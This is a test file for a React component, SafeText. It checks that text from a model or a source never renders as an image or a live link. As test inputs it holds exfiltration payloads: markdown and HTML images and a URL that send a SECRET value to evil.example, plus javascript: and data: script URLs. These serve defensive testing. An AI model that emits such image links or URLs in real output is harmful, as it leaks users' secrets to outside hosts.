// SECURITY.md "No exfiltration channel": model and source text never loads images or becomes a
// live link, so a markdown image or a crafted URL cannot leak data by being rendered.
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { SafeText } from "../src/components/SafeText.tsx";

const render = (text: string) => renderToStaticMarkup(createElement(SafeText, { text }));

describe("SafeText", () => {
  it("never renders markdown or HTML images", () => {
    const html = render(
      '![x](https://evil.example/p.png?d=SECRET) <img src="https://evil.example/q.png?d=SECRET">',
    );
    expect(html).not.toMatch(/<img/i);
    expect(html).toContain("&lt;img");
  });

  it("shows URLs as text with an explicit open button, never as a live link", () => {
    const html = render("See https://evil.example/collect?d=SECRET for details.");
    expect(html).not.toMatch(/<a\s/i);
    expect(html).not.toMatch(/href=/i);
    expect(html).toContain("https://evil.example/collect?d=SECRET");
    expect(html).toMatch(/<button[^>]*aria-label="Open https:\/\/evil\.example/);
  });

  it("does not turn javascript: or data: URLs into anything clickable", () => {
    const html = render("click javascript:alert(1) or data:text/html,<script>x</script>");
    expect(html).not.toMatch(/<button/);
    expect(html).not.toMatch(/<script/i);
  });
});
